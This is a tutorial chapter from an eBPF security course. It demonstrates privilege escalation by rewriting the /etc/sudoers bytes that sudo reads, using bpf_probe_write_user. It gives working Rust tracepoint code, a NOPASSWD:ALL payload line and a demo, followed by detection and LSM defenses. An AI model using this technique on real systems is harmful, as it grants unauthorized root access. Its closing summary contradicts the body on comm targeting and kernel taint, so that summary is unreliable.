---
title: "Faking your way to root (lab-only offense)"
order: 41
part: Security & LSM
description: "The third lab-only offense: intercept the read() a privileged process makes and rewrite the bytes it gets back. When sudo reads /etc/sudoers, inject a line granting full privileges — the file on disk untouched — to see how read-buffer tampering escalates, and how to detect it."
duration: 45 minutes
---

Chapter 39 hid a process by editing a syscall's *output*. The same move,
pointed at a different syscall, escalates privilege. When you run `sudo`, it
reads its policy from `/etc/sudoers` to decide what you're allowed to do. If
an eBPF program rewrites the bytes `sudo` gets back from that `read()` —
injecting a line that grants you everything — `sudo` obeys a policy that was
never written to disk. This is the last of the lab-only offenses, and like
the others its real payload is the **detection** at the end. It is, to be
unambiguous, an attack technique built here only to be understood and caught.

The code is in `examples/41-sudoadd/`. `./demo.sh` there builds, deploys,
and runs it; its `README.md` covers what it does and how to drive it.

{% include excalidraw.html
   file="sudo-escalate"
   alt="sudo calls read on /etc/sudoers. An eBPF read-exit hook checks whether the current process is named sudo and the returned buffer begins with the sudoers header, and if so overwrites that buffer in memory. sudo then sees an injected line and grants root. The file on disk is never touched — only the bytes sudo reads into memory. Defense: the same tells as Chapter 39 (kernel taint, loaded programs), and an LSM can block bpf_probe_write_user."
   caption="Figure 41.1 — The file on disk is never touched; only the bytes sudo reads are forged" %}

## Why reads are forgeable

A program trusts what `read()` returns. It has no way to know the bytes came
from the file on disk versus a kernel-side tamperer — the kernel fills a
user buffer and the program parses it. `sudo` is a juicy target because the
bytes it reads (`/etc/sudoers`) *are* the security policy. Overwrite them
between the kernel's fill and sudo's parse and you've rewritten the policy
for that one invocation, leaving the on-disk file pristine and the change
invisible to anyone who `cat`s it.

The mechanics mirror Chapter 39: capture the buffer on `sys_enter_read`,
rewrite it on `sys_exit_read` with `bpf_probe_write_user`. The new wrinkle is
*targeting* — and it's subtler than it looks. Matching the process name (`comm
== "sudo"`) is necessary but nowhere near sufficient; getting it wrong doesn't
just miss, it **bricks sudo** (see "Why matching `comm` isn't enough" below).
The reliable target is the read of the sudoers *header*, which we recognize by
its content.

## How the code works

### Capturing the read (enter)

```rust
#[map] static READS: HashMap<u64, ReadCtx> = HashMap::with_max_entries(1024, 0);

#[tracepoint] // syscalls:sys_enter_read
pub fn enter_read(ctx: TracePointContext) -> u32 {
    if !comm_is(b"sudo") { return 0; }                  // only sudo's reads
    // args: fd(@16), char *buf(@24), size_t count(@32)
    let buf: u64 = match unsafe { ctx.read_at(24) } { Ok(v) => v, _ => return 0 };
    let count: u64 = match unsafe { ctx.read_at(32) } { Ok(v) => v, _ => return 0 };
    let _ = READS.insert(&bpf_get_current_pid_tgid(), &ReadCtx { buf, count }, 0);
    0
}
```

We stash the buffer pointer and size, keyed by `pid_tgid`, but only when the
calling process is `sudo` — `comm_is` compares `bpf_get_current_comm()`
against the literal `"sudo"`. Every other process's reads are ignored.

### Rewriting the result (exit)

```rust
#[map] static PAYLOAD: Array<Payload> = Array::with_max_entries(1, 0); // injected line + len
#[map] static SIG: Array<Sig> = Array::with_max_entries(1, 0);         // /etc/sudoers header

#[tracepoint] // syscalls:sys_exit_read
fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
    let ret: i64 = unsafe { ctx.read_at(16) }.map_err(|_| ())?;          // bytes read
    let key = bpf_get_current_pid_tgid();
    let rc = *unsafe { READS.get(&key) }.ok_or(())?;
    let _ = READS.remove(&key);
    if ret < SIG_LEN as i64 { return Ok(()); }                          // too short to be the header

    // Only tamper a read whose buffer *starts with the sudoers header* — i.e.
    // a read at file offset 0. Library/ELF reads and mid-file chunks won't match.
    let sig = SIG.get(0).ok_or(())?;
    let head = unsafe { bpf_probe_read_user::<[u8; SIG_LEN]>(rc.buf as *const _) }.map_err(|_| ())?;
    if head != sig.bytes { return Ok(()); }

    let p = PAYLOAD.get(0).ok_or(())?;
    if p.len == 0 || p.len > 64 { return Ok(()); }                      // clamp to 1..=64 (see note)
    let len = p.len;
    if ret as u64 >= len as u64 && rc.count >= len as u64 {
        unsafe {
            bpf_probe_write_user(
                rc.buf as *mut core::ffi::c_void,
                p.line.as_ptr() as *const core::ffi::c_void,
                len,
            );
        }
        bump(&TAMPERS, 0, 1);
    }
    Ok(())
}
```

The pieces:

- We look up the buffer we recorded on entry. Without the enter hook the
  exit handler would only have the byte count, not where the bytes are.
- The **signature** is the first 16 bytes of `/etc/sudoers`, captured by the
  loader at startup and stored in `SIG`. We read the same-sized prefix of
  sudo's buffer and only proceed on a match — that's what pins the tamper to a
  read of the sudoers *header* and nothing else.
- The **payload** is a sudoers line like
  `someuser ALL=(ALL:ALL) NOPASSWD:ALL #`, built by the loader and stored in
  a map. It ends in ` #` so that whatever original sudoers content follows it
  in the buffer becomes a trailing comment — the rest of the file still
  parses, but our line is now in force.
- We **overwrite the first `p.len` bytes** of sudo's buffer with the payload
  using `bpf_probe_write_user`, counting tampers for telemetry.
- `bpf_probe_write_user` is the same **kernel-tainting, lab-only** helper
  from Chapter 39 — using it is itself a detectable event.

> **Verifier note.** The size passed to `bpf_probe_write_user` is
> `ARG_CONST_SIZE`, so the verifier rejects any length it can't prove is
> non-zero — a value read from a map has range `[0, u32::MAX]`, and the `0`
> makes it fail with *"R3 invalid zero-sized read"*. Clamping to `1..=64` (the
> `p.len == 0 || p.len > 64` guard) gives the verifier the lower bound it needs.

The loader builds the payload for a target user (default a freshly created
unprivileged account), captures the sudoers signature into `SIG`, writes the
payload into `PAYLOAD`, attaches both tracepoints, and exports
`ebpf_sudo_tampered_total`.

### Why matching `comm` isn't enough

`comm == "sudo"` is the obvious target filter, and it is *catastrophically*
incomplete. Overwriting every `read()` a `sudo` process makes fails two ways,
both observed on a live Fedora 44 box:

- **It bricks sudo before it reads any policy.** The dynamic loader `read()`s
  the ELF headers of shared libraries (`libaudit.so`, …) at process startup,
  all under `comm == "sudo"`. Smash one and sudo dies with `error while loading
  shared libraries: /lib64/libaudit.so.1: invalid ELF header`. Worse, since
  *only* `sudo` reads are corrupted, you can't `sudo pkill` to recover — you've
  locked yourself out and need an out-of-band root (or a reboot). Matching the
  sudoers header sidesteps this: an ELF header never looks like `## Sudoers…`.
- **It misses the parse read.** sudo reads `/etc/sudoers`, then `lseek()`s back
  to 0 and **re-reads it** for the actual policy parse. Tampering only the
  first read — or targeting the file descriptor and unmarking it after one
  hit — leaves that second, authoritative read clean, and nothing escalates.
  Content-matching wins here for free: the file on disk is never modified, so
  *every* offset-0 read (validation pass and parse pass alike) still carries
  the original header and still matches the signature.

The lesson generalizes past this one attack: when you tamper syscall results,
target by *what the data is*, not by which process or fd produced it.

## Build, deploy, observe

```bash
cd examples/41-sudoadd && ./demo.sh
```

The demo creates an unprivileged user on the target, builds a payload
granting *that* user sudo, attaches the program, and then repeatedly invokes
`sudo` so the tamper counter moves. The point to see is the **before/after**:
with the program detached the unprivileged user cannot use `sudo`; with it
attached, `sudo` reads the injected policy and lets them run commands as
root — while `cat /etc/sudoers` on disk shows no such line.

## Detecting it

The same toolkit as Chapter 39, plus one policy control:

1. **Unexpected loaded programs.** `sudo bpftool prog show` reveals
   tracepoints on `read` — there is no benign reason for one to exist on a
   server, and enumerating loaded programs is a standing detection. This is the
   most reliable tell, and it's the one to lean on (see the taint caveat below).
2. **Policy that disagrees with behavior.** What `sudo` *granted* doesn't
   match what `/etc/sudoers` *says*; an auditor comparing effective sudo
   rights against the on-disk policy catches the divergence even though the
   file is pristine.
3. **Prevent the primitive.** An LSM program (Chapters 37, 40) can deny the
   `bpf` operations that load such tools, or restrict `bpf_probe_write_user`
   — defense turning eBPF against the very technique.

> **Don't count on a kernel taint.** Older write-ups (and earlier drafts of
> this chapter) say `bpf_probe_write_user` flips `/proc/sys/kernel/tainted` and
> makes `dmesg` warn. On the lab kernel (7.1.3) it does **neither** — verified
> across many loads: `tainted` stays `0`, `journalctl -k` for the whole boot
> shows no "may corrupt user memory" line, and no per-call notice appears. The
> helper is silent here, which is exactly why detection #1 (enumerate loaded
> programs) rather than a passive taint flag is the one to rely on.

**In Grafana** (`127.0.0.1:3000` → Explore), graph `rate(ebpf_sudo_tampered_total[1m])` — sudoers-tamper events.

## What you learned

- A privileged process trusts `read()`; rewriting its result buffer with
  `bpf_probe_write_user` lets you **forge the policy `sudo` reads**, escalating
  privilege without touching the file on disk.
- **Targeting by `comm`** keeps the tampering scoped to the victim process.
- Detection is the same trio (taint, loaded-program enumeration,
  behavior-vs-config audit) — and LSM can deny the loading primitive
  outright.

Next, Chapter 42 closes the security part by turning all of this into a
**telemetry sensor**: many security-relevant hooks feeding one event stream,
the shape of a real runtime-security tool.

---

*Verification status: <span class="status status--verified">verified — Fedora 44, kernel 7.1.3, sudo 1.9.17p2</span>.
Built on the host, run on the lab VM. Detached, `victim` cannot sudo; while
attached, `sudo -u victim sudo -n id` returns `uid=0(root)` on the first
attempt and sudo itself stays healthy; on detach `victim` is denied again and
`/etc/sudoers` on disk is unchanged. The original program was rejected by this
kernel's verifier (`bpf_probe_write_user` size is `ARG_CONST_SIZE` → the
possibly-zero length failed as "R3 invalid zero-sized read"); the size is now
clamped to `1..=64`. Targeting was moved from `comm`-only to a sudoers-header
signature after the `comm`-only version corrupted sudo's shared-library reads
and missed the `lseek`-rewound parse read (both detailed above).*
